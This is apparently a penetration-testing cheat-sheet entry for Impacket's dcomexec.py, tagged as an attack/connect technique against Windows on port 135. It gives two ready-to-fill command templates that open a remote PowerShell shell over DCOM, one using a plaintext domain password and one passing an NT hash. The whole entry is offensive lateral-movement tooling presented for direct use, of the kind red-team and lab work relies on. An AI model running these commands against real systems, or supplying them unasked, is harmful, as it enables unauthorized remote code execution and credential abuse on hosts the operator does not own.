# dcomexec (imp)

% windows, impacket-exec, dcom

## dcomexec
#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  
Execute a command shell without touching the disk or running a new service using DCOM

```
dcomexec.py -shell-type powershell '<domain_fqdn>/<user>:<password>'@<ip>
```

## pth 
#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  

Execute a command shell without touching the disk or running a new service using DCOM

```
dcomexec.py -shell-type powershell -hashes <nt_hash> <user>@<ip>
```
